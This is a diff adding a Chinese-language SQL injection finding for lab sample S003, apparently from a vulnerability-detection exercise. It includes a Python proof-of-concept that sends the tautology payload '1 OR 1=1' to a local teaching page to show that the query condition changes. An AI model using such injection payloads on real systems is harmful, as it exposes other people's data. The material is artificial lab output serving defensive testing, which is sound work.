@@ -1,0 +1,81 @@
+```json
+{
+  "sample_id": "S003",
+  "prediction": "vulnerable",
+  "vulnerability_type": "SQL注入",
+  "locations": ["F01:0007", "F01:0010", "F01:0011"],
+  "evidence": {
+    "source": "F01:0007 直接读取外部可控的 GET 参数 id，未做类型转换、过滤或白名单校验",
+    "flow": "F01:0010 将 $id 原样拼接到 SQL 字符串的 WHERE id = 子句中，动态内容进入 SQL 结构",
+    "guard": "无效：未见预处理绑定、整数校验、转义或白名单；F01:0010 直接字符串拼接，F01:0011 执行",
+    "sink": "F01:0011 调用 $db->query($sql) 执行拼接后的 SQL；执行点在本页输入包中"
+  },
+  "prerequisites": [
+    "本地入口 http://127.0.0.1:4280/lab_cases/S003/index.php 可访问",
+    "common/db_connect.php 成功连接 MariaDB，$db 为可用 mysqli 连接",
+    "lab_people 表存在并预置 1 Alice、2 Bob、3 Carol",
+    "GET 参数 id 可由请求方控制"
+  ],
+  "missing_context": [
+    "common/db_connect.php 内容未包含在输入包中，连接参数与 mysqli 错误报告模式未知；但 F01:0011 的实际执行点已在本页提供"
+  ],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "保存为 poc_s003.py 后运行 python3 poc_s003.py。脚本仅访问 127.0.0.1:4280 的本地教学入口，分别请求普通输入 id=1 和不修改数据的测试输入 id=1 OR 1=1，并比较响应正文中的姓名。预期普通输入只出现 Alice；测试输入使 WHERE 条件恒真，出现 Alice、Bob、Carol（或至少比普通输入多出 Bob/Carol），即表明输入改变了 SQL 条件。失败时检查服务是否监听 127.0.0.1:4280、URL 路径是否正确、common/db_connect.php 是否成功连接数据库、lab_people 是否已初始化；不以 HTTP 200 作为成功条件。修复方向是使用预处理绑定并将 id 校验为整数，不应把建议修复当作已验证事实。"
+}
+```
+
+```python
+#!/usr/bin/env python3
+import urllib.parse
+import urllib.request
+
+BASE = "http://127.0.0.1:4280/lab_cases/S003/index.php"
+NAMES = ["Alice", "Bob", "Carol"]
+
+
+def fetch(payload: str):
+    url = BASE + "?" + urllib.parse.urlencode({"id": payload})
+    req = urllib.request.Request(url, method="GET")
+    with urllib.request.urlopen(req, timeout=5) as resp:
+        body = resp.read().decode("utf-8", "replace")
+        return resp.status, body, url
+
+
+def summarize(label: str, status: int, body: str, url: str):
+    found = [name for name in NAMES if name in body]
+    print(f"[{label}] URL: {url}")
+    print(f"[{label}] HTTP: {status}")
+    print(f"[{label}] 响应中出现的姓名: {found if found else '无'}")
+    print(f"[{label}] 是否显示查询失败: {'查询失败' in body}")
+    return found
+
+
+def main():
+    try:
+        normal_status, normal_body, normal_url = fetch("1")
+        test_status, test_body, test_url = fetch("1 OR 1=1")
+    except Exception as exc:
+        print(f"请求失败: {exc}")
+        print("请检查 127.0.0.1:4280 是否启动、入口路径是否正确、数据库连接是否可用。")
+        return
+
+    normal_found = summarize("普通", normal_status, normal_body, normal_url)
+    test_found = summarize("测试", test_status, test_body, test_url)
+
+    normal_only_alice = normal_found == ["Alice"]
+    test_expanded = all(name in test_found for name in ["Alice", "Bob", "Carol"])
+
+    print()
+    print(f"普通输入是否符合预期（仅 Alice）: {normal_only_alice}")
+    print(f"测试输入是否使结果扩展为 Alice/Bob/Carol: {test_expanded}")
+
+    if normal_only_alice and test_expanded:
+        print("观察结果：测试输入改变了 SQL 条件，支持 SQL 注入判定。")
+    else:
+        print("未观察到预期对照差异；请检查数据库初始化、连接文件和请求路径，不能仅凭 HTTP 状态判断。")
+
+
+if __name__ == "__main__":
+    main()
+```
